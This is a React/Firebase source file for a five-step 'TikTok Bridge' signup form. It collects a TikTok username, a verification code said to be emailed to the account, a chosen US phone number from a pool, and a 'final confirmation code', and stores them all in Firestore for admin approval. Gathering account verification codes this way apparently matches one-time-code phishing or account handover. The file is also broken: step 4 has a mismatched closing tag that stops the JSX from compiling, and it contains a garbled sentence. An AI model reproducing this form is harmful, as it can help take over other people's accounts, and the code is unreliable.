
"use client";

import { useState, useEffect }from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { useForm } from "react-hook-form";
import { User, Phone, KeyRound, Check, X, Loader2, AtSign, PartyPopper } from "lucide-react";
import { collection, doc, serverTimestamp, setDoc, getDoc } from "firebase/firestore";
import { useRouter } from "next/navigation";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Progress } from "@/components/ui/progress";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Carousel, CarouselContent, CarouselItem, type CarouselApi } from "@/components/ui/carousel"
import { useCollection, useFirestore, useMemoFirebase, useUser } from "@/firebase";
import { cn } from "@/lib/utils";
import { updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";
import { Badge } from "@/components/ui/badge";
import { successStories } from "@/lib/success-stories";


const featuredUsernames = successStories.map(story => story.creator.toLowerCase().replace('@', ''));

const TIKTOK_BRIDGE_STEPS = [
  { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
  { step: 2, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
  { step: 3, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
  { step: 4, title: "Final Confirmation", icon: KeyRound, fields: ['finalCode'] as const },
  { step: 5, title: "Success!", icon: PartyPopper, fields: [] as const },
];

const formSchema = z.object({
  username: z.string().min(2, "Username must be at least 2 characters.").refine(
    (value) => !featuredUsernames.includes(value.toLowerCase()),
    (value) => ({ message: `@${value} is a featured creator and cannot be used.` })
  ),
  verificationCode: z.string().length(6, "Code must be 6 digits."),
  usNumber: z.string({ required_error: "Please select a number." }),
  finalCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

interface PhoneNumber {
    id: string;
    phoneNumber: string;
    isAvailable: boolean;
    region: string;
    state: string;
    benefits: string[];
    disadvantages: string[];
    bonuses: string[];
}

export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
  const [api, setApi] = useState<CarouselApi>()
  const [currentStep, setCurrentStep] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [linkingMessage, setLinkingMessage] = useState<string | null>(null);
  const firestore = useFirestore();
  const { user, isUserLoading } = useUser();
  const router = useRouter();

  const phoneNumbersQuery = useMemoFirebase(() => {
      if (!firestore) return null;
      return collection(firestore, 'phone_numbers');
  }, [firestore]);
  const { data: phoneNumbers, isLoading: phoneNumbersLoading } = useCollection<PhoneNumber>(phoneNumbersQuery);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    mode: 'onChange',
    defaultValues: {
        username: "",
        verificationCode: "",
        usNumber: "",
        finalCode: "",
    }
  });

  useEffect(() => {
    const checkExistingSubmission = async () => {
      if (user && firestore) {
        const userDocRef = doc(firestore, 'tiktok_users', user.uid);
        const docSnap = await getDoc(userDocRef);
        if (docSnap.exists()) {
          // A submission already exists, maybe redirect to waiting or dashboard
           const userData = docSnap.data();
           if(userData.isVerified) {
               router.replace('/dashboard');
           } else {
                router.replace('/waiting-for-approval');
           }
        }
      }
    };
    checkExistingSubmission();
  }, [user, firestore, router]);
    
  const handleNext = async () => {
    const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
    if (fieldsToValidate?.length) {
      const isValid = await form.trigger(fieldsToValidate as any, { shouldFocus: true });
      if (!isValid) return;
    }
  
    if (currentStep >= TIKTOK_BRIDGE_STEPS.length - 1) return;
  
    setIsSubmitting(true);
    setLinkingMessage("Saving...");
  
    try {
      if (!firestore || !user) throw new Error("Authentication error. Please try again.");
  
      const submissionDocRef = doc(firestore, 'tiktok_users', user.uid);
  
      if (currentStep === 0) {
        setLinkingMessage("Saving your username...");
        const { username } = form.getValues();
        
        await setDoc(submissionDocRef, {
          id: user.uid,
          tiktokUsername: username,
          isVerified: false,
          createdAt: serverTimestamp(),
        });
  
      } else if (currentStep === 1) { 
          setLinkingMessage("Verifying code...");
          const { verificationCode } = form.getValues();
          await updateDocumentNonBlocking(submissionDocRef, { verificationCode });
      } else if (currentStep === 2) { 
          const { usNumber } = form.getValues();
          const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
          if (!selectedPhoneNumberDoc) throw new Error("Selected phone number not found");
  
          setLinkingMessage("Linking number to account...");
  
          const finalData = {
            phoneNumberId: selectedPhoneNumberDoc.id,
            phoneNumber: selectedPhoneNumberDoc.phoneNumber,
          };
          await updateDocumentNonBlocking(submissionDocRef, finalData);
          
          const phoneDocRef = doc(firestore, 'phone_numbers', selectedPhoneNumberDoc.id);
          await updateDocumentNonBlocking(phoneDocRef, { isAvailable: false });
      } else if (currentStep === 3) {
          setLinkingMessage("Finalizing your submission...");
          const { finalCode } = form.getValues();
          await updateDocumentNonBlocking(submissionDocRef, { finalCode });
      }
  
      setCurrentStep(prev => prev + 1);
  
    } catch (e: any) {
      console.error("An error occurred: ", e);
      form.setError("root", { type: "manual", message: e.message || "An unexpected error occurred." });
    } finally {
      setIsSubmitting(false);
      setLinkingMessage(null);
    }
  };

  const handlePrev = () => {
    if (isSubmitting || currentStep === 0) return;
    setCurrentStep(prev => prev - 1);
  };
  
  useEffect(() => {
    if (!api) return;
    api.scrollTo(currentStep, false);

    if (currentStep === TIKTOK_BRIDGE_STEPS.length - 1) {
        localStorage.setItem('submissionId', user!.uid);
        if (onFinished) {
            setTimeout(() => onFinished(), 1500);
        }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStep, api, user]); 
  
  const CurrentIcon = TIKTOK_BRIDGE_STEPS[currentStep]?.icon || User;
  const progressValue = ((currentStep) / (TIKTOK_BRIDGE_STEPS.length - 1)) * 100;
  
  const showLoadingSpinner = isSubmitting || isUserLoading;

  return (
    <Card className="rounded-2xl shadow-xl border-t w-full max-w-md mx-auto">
      <CardHeader>
        <Progress value={progressValue} className="mb-4 h-1.5" />
        <div className="flex items-center space-x-4 min-h-[48px]">
            <div className={cn(
                "flex h-10 w-10 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0"
            )}>
                <CurrentIcon className={cn("h-6 w-6")} />
            </div>
            <div>
                <CardTitle className="text-xl">{TIKTOK_BRIDGE_STEPS[currentStep]?.title}</CardTitle>
                {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 &&
                    <CardDescription>Step {currentStep+1} of {TIKTOK_BRIDGE_STEPS.length - 1}</CardDescription>
                }
            </div>
        </div>
      </CardHeader>
      <Form {...form}>
        <form onSubmit={(e) => e.preventDefault()}>
          <CardContent className={cn("min-h-[350px]", { 'h-[280px]': currentStep !== 2, 'h-[400px]': currentStep === 2 }, 'transition-[height] duration-300 ease-in-out')}>
            {form.formState.errors.root && (
                <div className="text-destructive text-sm font-medium p-2 text-center">{form.formState.errors.root.message}</div>
            )}
            <Carousel setApi={setApi} opts={{ watchDrag: false, allowTouchMove: false }} className="w-full">
              <CarouselContent>
                {/* Step 1: Username */}
                <CarouselItem>
                    <div className="flex flex-col justify-center h-[280px]">
                        {showLoadingSpinner && currentStep === 0 ? (
                            <div className="flex flex-col items-center justify-center h-full text-center">
                                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
                                <p className="text-muted-foreground">{linkingMessage || 'Initializing...'}</p>
                            </div>
                        ) : (
                            <FormField
                                control={form.control}
                                name="username"
                                render={({ field }) => (
                                <FormItem className="pt-2">
                                    <FormLabel>TikTok Username</FormLabel>
                                    <FormControl>
                                    <div className="relative">
                                        <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                                        <Input placeholder="your_username" {...field} className="pl-10 h-11" />
                                    </div>
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                                )}
                            />
                        )}
                    </div>
                </CarouselItem>

                {/* Step 2: First Code */}
                <CarouselItem>
                    <div className="flex flex-col justify-center h-[280px] items-center">
                        {isSubmitting ? (
                            <div className="flex flex-col items-center justify-center h-full text-center">
                                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
                                <p className="text-muted-foreground">{linkingMessage}</p>
                            </div>
                        ) : (
                            <FormField
                            control={form.control}
                            name="verificationCode"
                            render={({ field }) => (
                            <FormItem className="pt-2 flex flex-col items-center">
                                <FormLabel>Verification Code</FormLabel>
                                <FormControl>
                                    <InputOTP maxLength={6} {...field}>
                                        <InputOTPGroup>
                                            <InputOTPSlot index={0} />
                                            <InputOTPSlot index={1} />
                                            <InputOTPSlot index={2} />
                                            <InputOTPSlot index={3} />
                                            <InputOTPSlot index={4} />
                                            <InputOTPSlot index={5} />
                                        </InputOTPGroup>
                                    </InputOTP>
                                </FormControl>
                                <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">We sent a email the account linked to this address.</p>
                                <FormMessage />
                            </FormItem>
                            )}
                        />
                       )}
                    </div>
                </CarouselItem>

                {/* Step 3: Select Number */}
                <CarouselItem>
                    <div className="h-[400px]">
                        <FormField
                            control={form.control}
                            name="usNumber"
                            render={({ field }) => (
                            <FormItem className="pt-2 h-full flex flex-col">
                                <FormLabel>Choose a US Number</FormLabel>
                                <FormMessage className="pb-2"/>
                                <FormControl className="flex-grow">
                                <ScrollArea className="h-full w-full pr-4">
                                    {isSubmitting ? (
                                        <div className="flex flex-col items-center justify-center h-full text-center">
                                            <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
                                            <p className="text-muted-foreground">{linkingMessage}</p>
                                        </div>
                                    ) : phoneNumbersLoading ? (
                                        <div className="flex justify-center items-center h-full">
                                            <Loader2 className="animate-spin h-8 w-8 text-primary" />
                                        </div>
                                    ) : (
                                        <div className="space-y-3">
                                        {phoneNumbers?.filter(n => n.isAvailable).map((number) => (
                                            <Card 
                                                key={number.id} 
                                                onClick={() => isSubmitting ? null : field.onChange(number.phoneNumber)}
                                                className={cn(
                                                    "cursor-pointer transition-all hover:shadow-md hover:border-primary/50 rounded-xl",
                                                    field.value === number.phoneNumber && "border-primary ring-2 ring-primary/50 shadow-lg"
                                                )}
                                            >
                                                <CardHeader className="p-4">
                                                    <div className="flex justify-between items-start">
                                                        <div>
                                                            <CardTitle className="text-lg">{number.phoneNumber}</CardTitle>
                                                            <CardDescription>{number.region}, {number.state}</CardDescription>
                                                        </div>
                                                        <Badge variant={number.isAvailable ? "default" : "secondary"} className={cn(number.isAvailable ? "bg-green-100 text-green-800 border-green-200" : "bg-red-100 text-red-800 border-red-200")}>{number.isAvailable ? "Available" : "Taken"}</Badge>

                                                    </div>
                                                </CardHeader>
                                                {(number.benefits?.length > 0 || number.disadvantages?.length > 0) && (
                                                <CardContent className="p-4 pt-0 text-sm">
                                                    {number.bonuses && number.bonuses.length > 0 && (
                                                        <div className="mb-3">
                                                            <h4 className="font-semibold mb-1 text-primary">Bonuses</h4>
                                                            <ul className="list-disc pl-5 space-y-1 text-foreground/80">
                                                                {number.bonuses.map((bonus, i) => <li key={i}>{bonus}</li>)}
                                                            </ul>
                                                        </div>
                                                    )}
                                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                        {number.benefits?.length > 0 && <div>
                                                            <h4 className="font-semibold mb-2 flex items-center text-green-600 dark:text-green-400"><Check className="h-4 w-4 mr-2"/>Benefits</h4>
                                                            <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                                {number.benefits.map((benefit, i) => <li key={i} className="flex items-start"><Check className="h-4 w-4 mr-2 mt-1 text-green-500 shrink-0"/><span>{benefit}</span></li>)}
                                                            </ul>
                                                        </div>}
                                                        {number.disadvantages?.length > 0 && <div>
                                                            <h4 className="font-semibold mb-2 flex items-center text-red-600 dark:text-red-400"><X className="h-4 w-4 mr-2"/>Disadvantages</h4>
                                                            <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                                {number.disadvantages.map((disadvantage, i) => <li key={i} className="flex items-start"><X className="h-4 w-4 mr-2 mt-1 text-red-500 shrink-0"/><span>{disadvantage}</span></li>)}
                                                            </ul>
                                                        </div>}
                                                    </div>
                                                </CardContent>
                                                )}
                                            </Card>
                                        ))}
                                        </div>
                                    )}
                                </ScrollArea>
                                </FormControl>
                            </FormItem>
                            )}
                        />
                    </div>
                </CarouselItem>

                {/* Step 4: Final Code */}
                <CarouselItem>
                    <div className="flex flex-col justify-center h-[280px] items-center">
                       {isSubmitting ? (
                            <div className="flex flex-col items-center justify-center h-full text-center">
                                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
                                <p className="text-muted-foreground">{linkingMessage}</p>
                            </div>
                       ) : (
                        <FormField
                            control={form.control}
                            name="finalCode"
                            render={({ field }) => (
                            <FormItem className="pt-2 flex flex-col items-center">
                                <FormLabel>Final Confirmation Code</FormLabel>
                               <FormControl>
                                <InputOTP maxLength={6} {...field}>
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTP>
                                </InputOTP>
                            </FormControl>
                                <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Enter the final 6-digit code to complete the process.</p>
                                <FormMessage />
                            </FormItem>
                            )}
                        />
                       )}
                    </div>
                </CarouselItem>
                
                {/* Step 5: Success */}
                <CarouselItem>
                    <div className="text-center py-8 flex flex-col items-center justify-center h-[280px]">
                        <PartyPopper className="h-20 w-20 text-primary" />
                        <h3 className="text-xl font-semibold mt-4">Successful!</h3>
                        <p className="text-muted-foreground mt-2 max-w-[250px]">Your submission is complete. You will be redirected shortly to await admin approval.</p>
                    </div>
                </CarouselItem>

              </CarouselContent>
            </Carousel>
          </CardContent>
          
          {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 && (
            <CardFooter className="flex-col-reverse gap-4 pt-4">
              <Button type="button" onClick={handleNext} disabled={showLoadingSpinner || (currentStep === 2 && phoneNumbersLoading)} className="w-full rounded-full" size="lg">
                {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                {currentStep === 3 ? "Complete Submission" : "Continue"}
              </Button>
              {currentStep > 0 && currentStep < 4 &&
                <Button type="button" variant="ghost" onClick={handlePrev} disabled={isSubmitting} className="w-full rounded-full">Back</Button>
              }
            </CardFooter>
          )}
        </form>
      </Form>
    </Card>
  );
}
